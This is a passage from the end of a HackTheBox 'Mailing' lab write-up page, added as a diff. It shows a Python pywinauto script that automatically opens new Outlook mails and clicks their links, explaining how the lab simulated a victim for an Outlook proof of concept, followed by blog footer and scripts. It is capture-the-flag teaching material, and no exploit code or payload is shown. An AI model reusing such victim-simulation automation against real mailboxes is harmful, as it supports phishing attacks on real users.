class="string">&quot;uia&quot;</span>).connect(title_re=<span class="string">&quot;Inbox*&quot;</span>)</span><br><span class="line">dlg = app.top_window()</span><br><span class="line">current_count = 0</span><br><span class="line">remove = 2</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">        try:</span><br><span class="line">                unread = dlg.InboxListBox</span><br><span class="line">                items = unread.item_count()</span><br><span class="line">                <span class="keyword">if</span> items==1:</span><br><span class="line">                        <span class="built_in">sleep</span>(20)</span><br><span class="line">                        <span class="built_in">continue</span></span><br><span class="line">                <span class="keyword">if</span> items != current_count:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> range(1,items-current_count-(remove-1)):</span><br><span class="line">                                <span class="keyword">if</span> <span class="string">&quot;Yesterday&quot;</span> <span class="keyword">in</span> unread.texts()[i][0]:</span><br><span class="line">                                        remove = 3</span><br><span class="line">                                        <span class="built_in">continue</span></span><br><span class="line">                                unread[i].<span class="keyword">select</span>()</span><br><span class="line">                                message = dlg.child_window(auto_id=<span class="string">&quot;RootFocusControl&quot;</span>, control_type=<span class="string">&quot;Document&quot;</span>).Hyperlink.invoke()</span><br><span class="line">                                <span class="built_in">sleep</span>(45)</span><br><span class="line">                                dlg.type_keys(<span class="string">&quot;&#123;ENTER&#125;&quot;</span>)</span><br><span class="line">                                unread[i].<span class="keyword">select</span>()</span><br><span class="line">                        current_count = items - remove</span><br><span class="line">                <span class="built_in">sleep</span>(20)</span><br><span class="line">        except:</span><br><span class="line">                pass</span><br></pre></td></tr></table></figure>
+
+<p>這個就是模擬點擊郵件裏面的鏈接，也就是模擬poc上outlook的操作，這樣一切都可以解釋的通了。</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#x6d;&#x61;&#110;&#x65;&#64;&#109;&#x61;&#x6e;&#101;&#x73;&#101;&#99;&#x2e;&#99;&#x6f;&#109;">&#x6d;&#x61;&#110;&#x65;&#64;&#109;&#x61;&#x6e;&#101;&#x73;&#101;&#99;&#x2e;&#99;&#x6f;&#109;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#109;&#97;&#110;&#101;&#x40;&#x6d;&#x61;&#x6e;&#x65;&#x73;&#x65;&#x63;&#x2e;&#x63;&#x6f;&#x6d;">&#109;&#97;&#110;&#101;&#x40;&#x6d;&#x61;&#x6e;&#x65;&#x73;&#x65;&#x63;&#x2e;&#x63;&#x6f;&#x6d;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&text=HackTheBox - Machine - Mailing"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&is_video=false&description=HackTheBox - Machine - Mailing"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Mailing&body=Check out this article: https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&name=HackTheBox - Machine - Mailing&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&t=HackTheBox - Machine - Mailing"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
